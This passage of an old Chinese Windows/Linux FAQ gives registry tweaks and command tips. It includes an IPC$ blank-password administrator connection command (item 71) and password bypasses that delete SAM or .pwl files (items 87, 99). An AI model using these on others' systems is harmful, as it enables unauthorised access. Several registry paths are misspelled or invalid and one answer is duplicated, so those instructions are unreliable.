      A:ACPI 是 Advanced Configuration and Power Interface(高级配置与电源管理) 的缩写，是 Intel、Microsoft 和东芝共同开发的一种电源管理标准。ACPI 是 Windows 的一部分，它帮助操作系统控制划拨给每一件与计算机相连的设备的电量， 有了ACPI，操作系统就可以把不同的外设关闭。在安装 Windows2000 时，有时报告“检测到 ACPI 兼容性问题……”，安装不能继续进行， 机器重新启动。这时，可以打开 CMOS 设置，把其中的“ACPI Function”设为 Disabled(禁用)，保存设置后重新启动机器，然后就可以顺利安装 Windows2000 了。有的主板支持 ACPI 功能并不完善，一般用户也不常用，建议将 ACPI 功能关闭。
   也可以在出现问题时重新开机，按下 F7 键就可以离开“ACPI MODE SETUP”，到“TEXT MODE SETUP”就可以继续安装了。   
    33,Q:打开 Windows98 的“回收站”，里面没有一个文件,但仍可以运行“清空回收站”命令，这是怎么回事?
      A:这种情况一般出现在一台机器上安装了多种操作系统的情况下，如 Win98+WinNT，或 Win98+Win2000 等， 因为这些操作系统使用了根目录下的相同的“回收站”文件夹 RECYCLED。这种情况一般不影响使用。   
    34,Q:硬盘整理完毕后，工具栏里的 Outlook 的图标变成了资源管理器的图标，怎么办? 
      A:右键单击 Outlook 图标，点“属性”，弹出“Outlook属性”窗口，点击“更改图标” 按钮，找到对应的图标后按“确定”。   
    35,Q:在 Win2000 下很多原先在 Win98 下熟悉的工具都不能在开始菜单或控制面板中找到了?
      A:在 Win2000 Professional 中，你有时可能会发现桌面主题不见了，其实你只要在“开始/运行”对话框 中输入 themes 后回车，就会看到桌面主题的窗口了，以后若觉得这样很麻烦，也可以在桌面上新建一个快捷方式，其路径是 \winnt\system32\themes.exe。   
    36,Q:恢复 Windows 系统注册表一法： 
      A:如果 Win95/98 启动或者运行时故障太多，以前又忘记了给运行正常时的系统注册表作备份;或者根本启动不了 Win95/98，该怎么办，其实我们可以使用 System.1st 恢复系统注册表。 　　细心的 Windows 用户应该知道，Windows98 在安装成功后会把第一次正常运行的 Win95/98 系统信息保存在启动盘(通常为 C 盘)根目录下的 System.1st 文件中，并且不会随 Win95/98 系统配置而改变。 　　
      下面介绍使用 System.1st 恢复系统注册表的操作步骤(假定 Win98 安装在 C:\Windows目录下)： 　
      在DOS环境下，执行如下系列命令： 　　
      Attrib －h －r －s C:\System.1st 　　
      Attrib －h －r －s C:\Windows\System.dat 　　
      Copy C:\System.1st C:\Windows\System.dat 　　
      Attrib ＋h ＋r ＋s C:\System.1st 
  注意：操作注册表应十分慎重！在操作前应做好备份！出问题后果自负。   
    37,Q:怎样锁住注册表，使 regedit.exe 不能编辑注册表? 
      A:用 regedit.exe 打开注册表，然后打开 HKEY_CURRENT_USER\Software\Microsoft\Windows\CrrentVersion\Polices\System，建一个 Dword 值 DisableRegistryTools，键值设为 1，这样就锁住了注册表。 
  注意！一旦用这种方法锁住了注册表，就不能用 regedit.exe 解锁了。不要自己把自己枪毙了！站长再次申明：操作注册表后果自负。   
    38,Q:怎样知道 Windows 的某个文件包含在安装盘的那个压缩包(cabinet)里? 
      A:这与 Windows\Inf 文件夹下的 LAYOUT.INF、LAYOUT1.INF、LAYOUT2.INF 文件有关。比如要找 ping.exe 文件的源压缩包，可以顺次打开以上三文件，查找“ping.exe”字符串，会在 LAYOUT1.INF 文件找到一串字符“ping.exe=8,,28672”，注意“=”号后的那个数字 8，它表明 ping.exe 是在安装盘的 8 号压缩包中，我们找到 8 号压缩包，是 NET8.CAB，然后双击打开(如果打不开请用 Winzip 试试)，就会发现 ping.exe 在这里，展开后就可以使用了。寻找其它的文件与此类似。 
      注意压缩包有 MINI*.CAB、NET*.CAB、Win98_*.CAB、PRECOPY*.CAB 等形式。“=”号后的那个数字如果为 0，则表明要找的文件不在压缩包中。   
    39,Q:了解 Windows 中一些大家不太熟悉的程序： 
      A: 
      fontreg.exe 字体注册程序 
      internat.exe 输入法切换程序 
      sysedit.exe 系统文件编辑程序 
      control.exe “控制面板”项目调用程序 
      fontview.exe 字体文件的默认关联程序 
      ieshwiz.exe 自定义文件夹向导 
      systray.exe 音量控制程序 
      taskman.exe 任务管理器 
      winfile.exe 文件管理器   
    40,Q:了解 NTFS (New Technology File System 新技术文件系统)?
      A:NTFS 是 Windows NT 操作环境和 Windows NT 高级服务器网络操作系统环境的文件系统。NTFS 的目标是提供：可靠性，通过可恢复能力(事件跟踪)和热定位的容错特征实现；增加功能性的一个平台；对 POSIX 需求的支持；消除 FAT 和 HPFS 文件系统中的限制。 
NTFS 提供长文件名、数据保护和恢复，并通过目录和文件许可实现安全性。NTFS 支持大硬盘和在多个硬盘上存储文件(称为跨越分区)。例如，一个大公司的数据库可能大得必须跨越不同的硬盘。NTFS 提供内置安全性特征，它控制文件的隶属关系和访问。从 DOS 或其他操作系统上不能访问 NTFS 分区上的文件。这是Windows NT 安全性系统的一部分，但是，只有在使用 NTFS 时才是这样。
NTFS 允许文件名的长度可达 256 个字符。虽然 DOS 用户不能访问 NTFS 分区，但是 NTFS 文件可以拷贝到 DOS 分区。每个 NTFS 文件包含一个可被 DOS 文件名格式认可的 DOS 可读文件名。这个文件名是 NTFS 从长文件名的开始字符中产生的。          
 41,Q:手动建立右键关联：
    A:以给 *.htm 文件建立右键关联为例，让右键选单中出现“用记事本打开”项：打开资源管理器，选“查看/文件夹选项/文件类型”，在“已注册的文件类型”列表框中找到“Microsoft HTML Document 5.0”(对 IE5.0)，点“编辑”按钮，再点“新建”按钮，在“操作”文本框中输入“用记事本打开”字样，在下面的应用程序文本框中输入可执行文件的正确路径，本例中输入　"c:\windows\notepad.exe" "%1"，确定(%1 表示将本文档作为 Notepad 的命令行参数传递过去)。  
 42,Q:Windows98 资源管理器 Explorer 命令行参数“[/e,][/root],[<文件夹>]”的用法：
    A:命令格式：Explorer [/e,][/root],[<文件夹>]
      参数含义：/e     使用“资源管理器”视图显示，显示典型的资源管理器窗口
     /root,<文件夹>     打开文件夹，并作为资源管理器的跟目录
     (在机器上实际验证一下就会明白更多…)  
 43,Q:在安装 Windows 98 的机器上怎样进入 DOS6.22 ?
    A:首先要保证 Win98 是在 DOS6.22 的基础上安装的，这样要进入 DOS6.22 才有可能，这意味者 C: 盘的分区大小在 2G 以下，为 FAT16 类型的分区。要进入 DOS6.22，只要在机器启动到 Starting Windows 98... 时，按 F8 键，就会出现一个选单，选第 7 项回车就可以了。Windows98 默认是不显示这个选单的，如果希望 Windows98 自动显示该选单，则在 C:\MSDOS.SYS 的 [Options] 节加入一条 BootMulti=1 语句就可以了。示例如下：
   [Options]
        BootMulti=1
        BootMenu=1
        BootGUI=1
        AutoScan=1
        WinVer=4.10.1998  
 44,Q:Windows 软件关机一法：
    A:在“开始\运行”中输入 RUNDLL.EXE user.exe,exitwindows，确定后运行该命令，即可实现软关机。  
 45,Q:在 Windows2000 中实现多用户管理:
    A:Windows95/98 的用户都知道，Windows95/98 的用户密码形同虚设，在登录系统时，只需要简单地按“取消”按钮就可以进入系统。使用 Windows 2000 就不会出现这种情况。它可以实现密码控制，用户必须输入用户名和密码才能使用电脑，你不再需要另外安装什么安全软件了。
　　系统将用户分为管理者、用户和来宾三类，各有其不同的权限。双击“我的电脑/控制面板/用户和密码”图标，打开“用户和密码”对话框如图1所示。系统在安装完成后自动建立 Administrator(系统管理员)和 Guest(来宾)用户。你可在第一次启动按 Ctrl＋Alt＋Del 后选“更改密码”更改系统管理员的密码。你还可按“添加/删除”来添加/删除用户或用户组。
　　用户名列表上方有一个复选框“要使用本机，必须输入用户名和密码”，要使用用户管理必须使之有效，即：选中它。
　　系统管理员对用户和密码的管理权限主要有：添加用户、删除用户及更改用户。系统会在你添加新用户时询问其权限的设置。选择“高级”标签，再点击“高级”按钮，就会出现“本地用户和组”管理对话框窗口，上面列出了全部用户和按组分类的用户名单。在上述界面右边窗口中选中某个用户，点右键，在弹出的快捷菜单中选“属性”，弹出“用户属性”窗口，在其中可对此用户账号进行是否允许修改密码、是否停用账号等项设置。注意：停用账户和删除账户是有区别的，停用账户是临时停止某个账户的使用，随时可以恢复，而删除掉的账户必须重建后才能使用。  
 46,Q:在 Windows2000 中诊断硬件问题:
    A:如果某个外设有问题，可以用 Windows2000 中的“添加/删除硬件”这个方便的实用程序快速找到问题之所在。方法是，打开“控制面板”上的“添加/删除设备”，单击“下一步”，单击“添加/修复设备”，然后单击“下一步”。在 Windows2000 完成对新的即插即用设备的查找后，选择想要诊断和修复的设备，单击“下一步”，然后按照屏幕提示完成操作。  
 47,Q:在 Windows2000 中加密文件或文件夹:
    A:Windows2000 继承了 NT4.0 的“优良传统”，你可用 Windows2000 的加密工具来保护文件和文件夹，以防别人偷看。在“Windows 资源管理器”中，用鼠标右键单击想要加密的文件或文件夹，然后单击“属性”。单击“常规”选项卡上的“高级”，然后选定“加密内容以保证数据安全”复选框。当然你文件夹所在的分区应是 NTFS 格式。如果是 FAT16 或 FAT32，则不能实现这种功能。你可用 PQMagic 分区魔术师把分区的格式转换为 Windows2000 的特有格式 NTFS。  
 48,Q:Windows2000 中硬盘错误的检查与修复:
    A:利用 Windows2000 的错误检查工具，可以查找到硬盘上的文件系统错误和坏扇区。方法是，打开“我的电脑”，选择需要检查的本地磁盘。在“文件”菜单上单击属性，然后单击“工具”选项卡。单击“错误检查”下的“开始检查”，并选定“磁盘检查选项”下的“扫描并尝试恢复坏扇区”复选框。  
 49,Q:Windows2000 中错误安装的修复:
    A:Windows2000 的硬件兼容能力相对较差，有时候会出现这样的情况：安装完硬件重新启动后系统蓝屏显示硬件配置出错。如果按照 Windows98 的做法，你得以安全模式进入 Windows，把出错的硬件卸装，再重新启动以 Normal 方式进入后重新安装硬件。而在 Windows2000 里，你可以直接以最后一次正确安装的配置进入 Windows。方法是在启动时按 F8，选择“最后一次的正确配置”，然后选择你最后一次的硬件启动配置文件后启动即可。  
 50,Q:Windows2000 中“中文转换器”的使用:
    A:你可使用“中文转换器”来自由转换文件内码或进行简、繁体转换，而不需要再外挂一些内码转换工具。单击“开始/附件/中文转换器”打开程序，按以下步骤进行内码转换：
　　(1)设定“来源”：按“打开”按钮选定你要进行内码转换的文件；
　　(2)在“选项”里设置你进行的转换工作；
　　(3)按“立即转换”；
　　(4)按“目标”输入保存的文件名及路径。  
 51,Q:Windows 中 Shift 键的几种用法：
    A:1，进入安全模式：启动 Windows 时按住 Shift 键会进入安全模式；2，重新启动计算机时按 Shift 键，点击“确定”按钮，能快速启动机器；3，掉出“打开方式”对话框：按住 Shift 按钮，在选中的文件上右击鼠标，会在快捷菜单中出现“打开方式…”项；4，禁止启动组的执行：Windows98 启动登录时，按住 Shift 键直到系统登录结束，则启动组中的程序不会被执行。5，禁止自动播放功能：插入光碟时按住 Shift 键，直到光驱的指示灯灭掉，则光碟不会自动执行。(注：如果自动播放功能被关闭了，则按住 Shift 键会暂时恢复自动播放功能。)  
 52,Q:把“记事本”添加到 Windows 所有文件的右键菜单中：
    A:在注册表中添加下列主键：  HKEY-CLASSES-ROOT\*\shell\记事本\command
      将该主键右边的“(默认)”串值设为 "c:\windows\notepad.exe" "%1"  
 53,Q:清除注册表中非正常卸载软件的遗留垃圾：
    A:一些软件非正常卸载后，在控制面板的“添加/删除文件”中会有一些残留信息，可以从注册表删除它们，它们在注册表的以下路径： HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Uninstall  
 54,Q:清除注册表中 Windows 启动时自动加载的程序：
    A:这些被自动执行的程序在注册表的以下路径中：HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
      删除它们即可。  
 55,Q:同一机器安装多操作系统的部分注意事项：
    A:
   (1)、如果要在 C: 盘使用纯 DOS6.22 的话，C: 区必须为 FAT16 分区；
   (2)、各个 OS 最好安装在不同的分区上，因为 Windows 的 Program Files 文件夹下的内容会“打架”，严重的会导致 IE 等软件不能工作；
   (3)、NT 系列 OS 最好安装在 NTFS 分区上，Windows9x 系列 OS 最好安装在 FAT32 分区上。但如果有大量的数据要交叉共享，可以都选择 FAT16 类型的分区；
   (4)、最好能留一个 FAT16 分区作为共享软件、学习资料的存放分区；
   (5)、如果要安装 Linux 操作系统，则要给 Linux 预留 2 个分区，Linux 至少要有交换分区和数据分区各 1 个。Linux 分区的空间大小最好留 1G 以上。  
 56,Q:微软继 Windows2000 和 Office2000 之后的下一代主要软件有哪些?
    A:微软计划在 2001 年的下半年发布 WindowsXP 操作系统 和 OfficeXP 办公套件，它们分别是 Windows2000 和 Office2000 的换代产品。WindowsXP 即如今大家所称的 whistler。OfficeXP 是微软 Office 的第 10 个版本。另外，随着 2000 年 6 月微软 .net 战略的发布，微软相继推出了 COM+、ASP+、C#、ADO+、XML 等一系列的新技术和语言版本。看来大家又要随着微软更新知识了。

 57,Q:如何彻底清除误删除软件的遗留信息?
    A:软件被误删除后，会在注册表中和 Windows 目录下留下一些残留信息(如一些 dll 库文件)，这时有个技巧可以用：就是将误删的软件再安装一次，再正常删除它。  
 58,Q:改变 Windows9x 资源管理器的默认路径:
    A:右击资源管理器图标，选择“属性”，在“快捷方式”选项卡的“目标”栏中，将工作目录栏中的“C:\windows\explorer.exe /n,/e,c:\”中的“c:\”改为你想要设定的路径即可。  
 59,Q:改变 Windows9x 中 MS-DOS 的默认路径:
    A:右击“MS-DOS 快捷方式”图标，选择“属性”，单击“程序”选项卡，将工作目录栏中的“C:\windows”改为你想要设定的路径即可。  
 60,Q:给 WindowsNT4.0 的登录窗口上添加“关闭系统”按钮:
    A:将注册表 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\WinLogon 右边的 ShutdownWithoutLogon 键值改为 1 即可。  
 61,Q:彻底删除 Windows98 启动时自动运行的程序：
    A:
   (1)、检查 Autoexec.bat 文件中加载的程序；
   (2)、清除 Win.ini 文件中，[windows]节的 load= 和 run= 加载的程序；
   (3)、注册表的 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\run 下的键值(删除过的放在  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\run- 下)；
   (4)、删除 Windows 目录下的 winstart.bat 文件(可以看作 Windows 的一个后门)中加载的程序；
   (5)、删除 Windows 的“启动组”中加载的程序。
   (注：(2)(3)可以用 msconfig.exe 程序来完成。)  
 62,Q:禁止 Windows 活动桌面：
    A:禁止 Windows 活动桌面后，在桌面的属性窗口中，将不再出现 Web 选项页。方法：在注册表的 HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer 下，新建 16 进制 dword 键值 NoActiveDesktop，值为 01000000。值为 0 时表示启用。  
 63,Q:Windows 中禁止将最近操作过的文档放入文档菜单历史记录中：
    A:在注册表的 HKEY_LOCAL_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer 下，新建 16 进制 dword 键值 NoRecentDocsHistory，值为 1 表示禁止，值为 0 时表示允许。  
 64,Q:退出系统时，自动清除文档菜单中的历史记录：
    A:在注册表的 HKEY_LOCAL_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer 下，新建 16 进制 dword 键值 NoRecentDocsHistory，值为 1 表示禁止，值为 0 时表示允许。  
 65,Q:自动关闭 Windows 中停止响应的程序:
    A:在 HKEY_LOCAL_USER\Control Panel\desktop，项 AutoEndTasks，键值为 1 表示自动关闭，为 0 表示手工关闭。  
 66,Q:在 Windows 资源管理器中一次打开当前文件夹下的所有子文件夹：
    A:将当前文件夹点亮，按键盘右边小键盘上的 * 键或 + 键可以完全展开当前文件夹，按小键盘上的 - 键可以完全收缩文件夹。  
 67,Q:Windows 下破解隐藏的分区：
    A:有人通过修改注册表隐藏了硬盘的分区，在 Windows 的资源管理器中不能访问隐藏分区的数据。但是使用界面显得“老土”的 winfile 程序却可以访问隐藏的分区。这是某些人所始料未及的。  
 68,Q:恢复在 DOS 下删除的文件：
    A:DOS 下删除的文件 Windows 一般无能为力。但在“MS-DOS 方式”窗口下运行 lock 命令，选择“Yes”就解除了 Windows 对磁盘访问的限制，然后就可以执行命令 undelete 恢复删除的文件了。  
 69,Q:“MS-DOS 方式”窗口与 Windows 交换数据：
    A:把“MS-DOS 方式”切换到窗口状态(全屏状态下按 Ctrl+Enter)，可以看到窗口上有几个按钮，它们提供标记、拷贝、粘贴等功能，可以和 Windows 下的编辑器如 Word、记事本等交换数据。  
 70,Q:快速查找“网上邻居”里的机器：
    A:在资源管理器里的“网上邻居”存取别的机器的数据时，在网络已经物理连通的情况下，总是看不到别的机器，非常急人，有时还以为是网络故障。这时有一个快速的办法，就是在“开始”的“查找”菜单下查找要存取的机器，会立即找到该机器，就可以使用了。该办法在 Windows 对等网里屡试不爽！  
 71,Q:在 DOS 下以超级用户连接空白口令的 Windows2000 主机:
    A:如果 Windows2000 主机的 IP 地址被人探知，且超级用户的口令为空(这种情况多出现在由 Win9x 升级到 Win2000 时)，那么一般用户可以用
     NET use \\IP地址\IPC$"" /user:administrator
命令连接上 Windows2000 主机，增添/删除用户、修改注册表、管理服务进程(如 Telnet 服务)、格式化主机硬盘等。这是 Windows2000 的一个安全漏洞，且被一些好事的人利用。所以请大家在安装 Windows2000 后别忘了给超级用户加一个安全的密码！  
 72,Q:利用注册表启动 Windows2000 的 telnet 服务:
    A:将 HKEY_LOCAL_MACHINE\Software\Microsoft\Telneterver\1.0 的键值由 2 改为 1 即可。  
 73,Q:对等网中 Windows98 找不到 Windows2000 的机器:
    A:原因是 Win2000 用户组中 Guest 用户没有打开。这时如果 Win98 机器以 administrator 登录本地 Windows，则可以看到 Win2000 机器。  
 74,Q:Windows 的 win.ini 文件中自动运行程序的“load=”和“run=”有什么区别?
    A:load= 和 run= 都可以使 Windows 启动时自动运行程序，load 运行的程序以最小化方式运行，run 运行的程序以 Windows 默认的窗口方式运行。  
 75,Q:快速去掉 Win98 快捷方式图标上的小箭头:
    A:快捷方式的图标上都有一个小箭头，怎样去掉这个小箭头呢? 一般是通过修改注册表来实现，但还有一个快捷的办法：桌面上击右键，选“属性”，再选“外观”标签，在“项目”中选“图标”，将图标的大小由默认的 32 改为 30，确定。OK!  
 76,Q:防止 Windows98 匿名登录:
    A:在 Windows98 的登录窗口中,如果单击"取消"按钮或者按 Esc 键,任何人都可以实现登录,即"匿名登录"。通过修改注册表,可以防止匿名登录。具体方法为：打开注册表 HKEY_ LOCAL_MACHINE\Network\Logon 分支,在该分支下新建一个"DWORD值",名称为"MustBeValidated",将其值设为"1"即可。    
 77,Q:怎样在不损失数据的情况下把 FAT16 分区转换为 NTFS 分区
    A:在 NT 下有一个命令 convert 可以实现这一功能：convert (盘符): /fs:ntfs，如要将 D 盘转换成 NTFS 格式，convert d:/fs:ntfs 就可以了。注意：NT 下该转换不可逆转，要把 NTFS 转为 FAT 只能 format 分区了!  
 78,Q:让资源管理器的右键菜单中常驻“用 Notepad 打开”功能：
    A:打开注册表 HKEY_LOCAL_MACHINE\SOFTWARE\Classes\*，用鼠标右键单击 * 号，选择新建主键，输入名字：shell，再用鼠标右键单击刚做好的 shell，再建一个叫做 notepad 的主键(可取任意字符串)，并将 notepad 右边的(默认)改为：&Notpad(这里的 & 号作用是将 N 作为键盘快捷按键，你也可以将 & 放在后面，总之它是将后面的字符作为快捷按键)。然后在 HKEY_LOCAL_MACHINE\SOFTWARE\Classes\*\shell\Notepad 下边增加个叫 command 的主键，修改 command 右边的默认值(默认) 为 notepad.exe %1。(这里的 notepad.exe 指实际的“记事本”可执行程序。)  
 79,Q:修改注册表实现 Windows NT 的自动登录
    A:打开注册表 HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows NT/Current Version/Winlogon，所有关于 Windows NT 的登陆信息都在这里了。 选择“编辑”菜单中的“添加数值”，在数值名称中输入“AutoAdmin Logon”，数据类型为“REG_SZ”， 按“确定”后在弹出的“字符串编辑器”中输入“1”，表示允许自动登录(字符串为“0”时表示禁止自动登录)。 按以上做法，添加一个名为“Defaultpassword”的数值，并在“字符串”文本框中输入相应的用户密码。然后再打开“DefaultDomainName”及“DefaultUserName”，分别输入自动登录的“域”及“用户名”，保存并退出注册表编辑器。
   这样处理后，如果想临时以其他用户身份登录，可以在显示登录对话框之前按“Shift”键强制登录。注意：登录密码不能为空，否则修改后第一次可自动登录，之后“AutoAdmin Logon”的值会自动改为“0”。  
 80,Q:用 regedit 命令把注册表 .reg 文件导入注册表
    A:把 .reg 文件导入注册表的一般方法是用鼠标双击 .reg  的文件名“执行”它。其实 rededit 程序有一个隐藏的参数 /s，带上它就可以在命令行中导入 .reg 文件：
      regedit /s xxx.reg 

 81,Q:快速得到文件的绝对路径字符串
A:打开“开始/运行”窗口，把文件拖入其中，就在下拉组合框中得到了文件的绝对路径字符串。在 windows2000 下，资源管理器中已经不再显示文件的路径了，这种方法更加有效。 

 82,Q:简单限制用户更改机器的时间
    A:把 Windows\system 下的文件 Timedate.cpl  改名，再双击屏幕右下角系统托盘里的时间字样，就不能打开“日期/时间属性”设置窗口，当然就不能通过它来更改时间了。当然这种方法不能限制用户在 DOS 窗口中用 date 和 time 命令修改机器的时间。  
 83,Q:制作当前屏幕图像的拷贝
    A:按“Print Screen”键。按 Alt 加“Print Screen”键可以制作当前窗口图像的拷贝(在做教学演示图片时显得很方便)。  
 84,Q:如何防止类似“快乐时光”(Happy Time)之类的蠕虫病毒感染我的电脑?
    A:使用最新版的杀毒软件。卸载 Windows 的 Wsh 脚本组件。  
85,Q:取消 Windows2000 中 CDROM 的自动运行
    A:把注册表 HKLM\System\CurrentControlSet\Services\Cdrom 下的子键 Autorun 键值改为 0。也可以在 HKCR\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer 下建立二进制项 NoDriveTypeAutoRun，取值为 b5,00,00,00 试试。  
 86,Q:隐藏桌面上的“我的电脑”“回收站”“网上邻居”等系统图标
    A:展开注册表 HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace 分支，删掉其中的“我的电脑”“回收站”键值。在 HKCR\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer 下建立 Dword 项 NoNetHood，取值为 1，可以去掉桌面上的“网上邻居”图标。  
 87,Q:忘记了中文 WindowsNT4.0 的密码，如何进入系统?
    A:方案一：如果用的是 FAT16 的分区，用 DOS 软盘启动机器，把 winnt\system32\config\sam 删掉即可。如果用的是 NTFS 的分区，那就把硬盘拿下来，挂到别人的机器上，把 winnt\system32\config\sam 删掉。这样你就没有口令了。方案二：1、若你有应急盘最好。若你无应急盘，则到其它 NT 上制做应急盘，命令为 winnt /ox；2、用启动盘启动你的机器，选恢复->注册表->SAM 即可。注：千万不要恢复其它选项，尤其是用不相同的机器制成的应急盘恢复时! 恢复后的 administrator 口令为应急盘上 adminstrator 的口令。  
 88,Q:重建“显示桌面”快捷方式图标：
    A:不小心删掉 Windows98 “快速启动”工具栏中的快捷方式图标后，可以用以下方法恢复：
    建立一个名为“显示桌面.SCF”的文本文件，内容如下：
      [Shell]
       Command=2
       IconFile=explorer.exe,3 
      [Taskbar]
       Command=ToggleDesktop
    然后把该文件拖放到“快速启动”工具栏中即可。  
 89,Q:哪里可以找到韩语、日语等语言的输入法?
    A:安装一个 windows2000，里面就有韩文、日语等语言的输入法。  
 90,Q:我在很多书上看到通过修改注册表阻止非法进入 WIN98 的方法，即进入注册表分支：HEKY_LOCAL_MACHINE\Network\Logon，新建一个 DWORD 值，命名为 MustBeValidated，并将其键值改为“1”。但试过多次后，不起作用，不知何因?
    A:你的登录方式是不是“Microsoft 友好登录”? 如果不是的话，改成友好登录，然后再建立用户，设定密码，修改注册表就可以了。  
 91,Q:想改变一下 Windows Me 的开机画面，修改了 logo.sys 文件，但不能成功?
    A:Logo.sys 必须为 320×400，256 色位图，否则无法显示。Windows 系列的操作系统都可以这样修改。  
 92,Q:将 Windows98SE 系统属性中的“高级电源管理”删除后，如何重装?
    A:添加新硬件－从列表中选择－系统设备－生产商选“(标准系统设备)”－型号选“Advanced Configuration and Power Interface(ACPI) BIOS”。  
 93,Q:留学美国的学生装 Windows98 英文版，家在中国的父亲装 Windows98 中文版，父子之间的 Email 联络发生困难，有什么好的解决办法?
    A:总结一些人的使用经验，可以有这么几种办法：1、儿子装一个 NJstar(南极星汉字系统)，可以在英文操作系统下支持汉字的输入和显示。2、父亲将中文画面剪贴成图像文件，作为附件发给儿子，他只要“看图”就可以了。3、用中文 Word 写信，保存时选择属性里“嵌入所用字体”(缺点是文件偏大)，儿子用英文版的 Word 就能打开。注意：以上说到的文件最好不要以中文命名。  
 94,Q:为何在 Windows 的“关闭系统”中不见了“把您的计算机转入睡眠状态”选项?
    A:同时在 CMOS 和 Windows 中设置电源管理，就可以解决问题。  
 95,Q:手工修改 Windows 双启动机器的默认启动选项：
    A:安装了 Windows2000+Windows98 或 WindowsNT+Windows98 的双启动的机器，在启动时会显示一个操作系统选单，其默认的操作系统是 Windows2000 或 WindowsNT，但我们使用比较多的操作系统还是 Windows98，这就有些不太方便了。为了把 Windows98 修改为默认启动的操作系统，我们可以用纯文本编辑器打开 C:\boot.ini 文件(必须先去掉其系统属性)，将 [boot loader] 节的 default=multi(0)disk(0)…… 换成 default=C:\ 就可以了。例如：
   [boot loader]
    timeout=30
    default=multi(0)disk(0)rdisk(0)partition(2)\WINNT
   [operating systems]
    multi(0)disk(0)rdisk(0)partition(2)\WINNT="Microsoft Windows 2000 Server" /fastdetect
    C:\="Microsoft Windows" 
   修改后为：
   [boot loader]
    timeout=30
    default=C:\
   [operating systems]
    multi(0)disk(0)rdisk(0)partition(2)\WINNT="Microsoft Windows 2000 Server" /fastdetect
    C:\="Microsoft Windows" 
   其中 timeout=30 表示机器在显示操作系统选单后默认等待的时间(单位：秒)，30 秒后将自行启动默认的操作系统。
   注：还可以在 Windows2000 或 WindowsNT 里面通过有关设置修改默认启动的操作系统。  
 96,Q:安装 Windows98 后，在设备管理器的“其他设备”中有个黄色的问号：PCI CommunicationDevice。这是一个什么设备?
    A:这是 Modem 设备，估计是主板自带的，不需要的话可以在 BIOS 中屏蔽它。不屏蔽的话一般也不会影响电脑的使用。如果需要用 Modem 上网，可以删除该设备，刷新，然后安装 modem 自带的设备驱动程序。  
 97,Q:电脑用一阵时间后就几乎停顿。用进程管理器查看，发现有几十个 wscripe.exe 程序占用了大量的系统资源，请问 wscripe.exe 是什么程序，怎么处理? 
    A:估计是中了 HappyTime(快乐时光)病毒。用新版杀毒软件杀毒后就会恢复正常。  
 98,Q:Windows ME 中，开始菜单里的“运行”一项不见了，如何恢复?
    A:“开始”菜单中选“设置”-“任务栏和开始菜单”，然后在“高级”下面选中“显示运行”项，然后确定即可。  
 99,Q:如何取消 Windows 的“Windows 登录”窗口：
    A:删掉 Windows 文件夹下的 *.pwl 文件即可，这里存放着 Windows 的登录密码。  
Linux 问答
1,Q:在 Linux 中怎样实现类似 DOS 环境下的 AUTOEXEC.BAT 批处理功能? 
   A:将脚本添加到 /etc/rc.d/rc.local 中即可。这是由 Linux 启动时的第一个进程 init 控制的。init 进程还可以自动启动 /etc/rc、/etc/rc.d、/etc/rc?.d 目录下的许多脚本文件。   
  2,Q:Linux 中 NE2000 兼容网卡的安装? 
   A:目前市场上 NE2000 兼容网卡比较多,如 D-Link DE220p 等。如果 Linux 不能检测到这些网卡，则可以用手动的方法安装。以 D-Link DE220p 网卡为例，在 Red hat Linux6.0 和 Turbo Linux 下可以这样安装：首先检测出网卡的 IO 端口号和 irp 号，然后启动进入 Linux，在 /etc/rc.d/rc.sysinit 文件中加入语句(假设网卡的 IO=0x240,irp=0x5)： 
     modprobe ne.o io=0x240 irq=5 
然后启动 Linux 即可。 
     对于 Slackware Linux,可以编辑 /etc/rc.d/rc.modules 文件，将 NE2000 网卡驱动前的注释符号“#”去掉，设置网卡 IO 号即可,即: 
     /sbin/modprobe ne io=0x240   
  3,Q:Slackware Linux3.4 的 LILO 被破坏后的恢复： 
   A:一台同时安装 Slackware Linux3.4、Windows98、WindowsNT 的机器，在 Windows98 重新安装后，主引导区的 LILO 丢失，不能引导 Linux，按如下步骤处理后，就可以修复 LILO： 首先用 BOOT 盘引导机器，在 BOOT: 提示符后输入 mount root=/dev/hda4 回车，其中 hda4 是 Linux 的引导分区，应当根据你的具体情况而定；这样机器就会启动进入到 Linux 状态，然后以 root 用户登录，进入 /sbin 目录，运行 liloconfig 程序，选第 6 项“Reinstall LILO using the existing lilo.conf”，这样就会恢复原来的 LILO 设置。   
  4,Q:怎样将 LILO 备份到软盘上? 
   A:在 /sbin 目录下运行命令 lilo -b /dev/fd0 即可。备份的软盘可以用来启动 Linux 系统，与硬盘启动没有区别。   
  5,Q:能不能从 DOS 下启动 Linux? 
   A:能。例如 Red Hat Linux6.0 的光盘上有一个程序 loadlin，它就可以从 DOS 下启动 Linux。条件是你要有一个 Linux 内核映像文件 vmlinuz(可在 Linux 安装光盘上找)，还要知道 Linux 的启动分区。命令的执行格式为： 
     loadlin vmlinuz root=/dev/hda4 ; 其中 /dev/hda4 为 Linux 的 root 文件系统所在的硬盘分区 
     可以用这种方法恢复主引导分区中遭到破坏的 LILO 系统。   
  6,Q:Linux 能否实现用户登录运行脚本? 
   A:可以。用户登录时，Bash 首先执行全局登录脚本(由 root 建立) /etc/profile，然后在用户起始目录下依次寻找 .bash_profile、.bash_login、.profile 三个文件，执行最先找到的一个。可以用这种办法像 Netware 一样为不同的用户定制运行环境。 
     此外，用户退出登录时还可以运行 .bash_logout 脚本。   
  7,Q:在 Linux 中给命令指定别名(alias)：
   A:如果命令或命令序列太长，或不符合用户的习惯，那么为它指定一个别名是不错的办法。虽然可以为命令建立“链接”解决长文件名的问题，但对于带命令行参数的命令，链接就无能为力了。而指定别名则可以解决此类所有问题。只要举一些例子就可以了：
alias l='ls -l' ;用 l 代替 ls -l 命令(Xenix 下就有类似的 l 命令)
